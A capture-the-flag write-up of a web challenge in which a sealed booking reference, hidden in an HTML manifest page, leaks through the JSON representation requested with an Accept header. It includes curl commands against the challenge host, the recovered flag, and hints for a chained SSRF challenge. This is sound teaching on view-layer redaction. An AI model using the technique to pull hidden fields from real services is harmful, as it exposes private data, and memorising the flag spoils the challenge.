# Container Says This Side Up — Web

> Afterlight / Port operations. A public manifest preview omits a sealed field. Release the
> container to recover its record.
> `http://45.77.247.35:22010`

**Flag:** `CYBLTZ2026{534L3d_f13ld5_571ll_5h1p}`

A content-negotiation leak. The intended "sealed" field is simply exposed by a second
representation of the same resource.

## The preview hides a field

`GET /manifest` returns an HTML page for container **AF-2602** with Destination and Cargo, and
an explicit tell:

```
Preview view: operational fields are omitted. This resource also has a JSON representation.
```

The page says a release endpoint exists (`/release`) but needs a *sealed booking reference* that
the HTML view never prints.

## The JSON view does not hide it

Ask for the other representation and the sealed field is right there:

```bash
curl -s -H 'Accept: application/json' http://45.77.247.35:22010/manifest
```
```json
{"container": "AF-2602", "destination": "Meridian Quay", "cargo": "lighting spares",
 "release_endpoint": "/release",
 "_sealed_booking_ref": "BK-2602-1CBE3B57FA44037077A75FEF"}
```

`application/xml` is refused ("Only text/html and application/json…"), and `?format=json` still
returns the HTML — the only real toggle is the `Accept` header.

## Release

Post the recovered reference to `/release` (form-encoded or JSON both work):

```bash
curl -s -X POST http://45.77.247.35:22010/release \
     -d 'booking_ref=BK-2602-1CBE3B57FA44037077A75FEF'
```
```json
{"flag": "CYBLTZ2026{534L3d_f13ld5_571ll_5h1p}",
 "routing_hint": {"service": "berth-api", "berth": 42, "port": 8080}}
```

## Note — this feeds Berth Control

Keep the sealed reference **and** that `routing_hint`. Both are prerequisites for
[Berth Control](berth-control.md): the SSRF there is gated behind an `X-Booking-Ref` header set
to `BK-2602-1CBE3B57FA44037077A75FEF`, and the internal record you must reach is
`http://berth-api:8080/berths/42`.

**Takeaway:** when a UI claims a field is "redacted" or "omitted for presentation," try every
other representation of the same endpoint (`Accept:` negotiation, `.json`, `?format=`,
`?export=`). Redaction applied only at the view layer is not redaction.
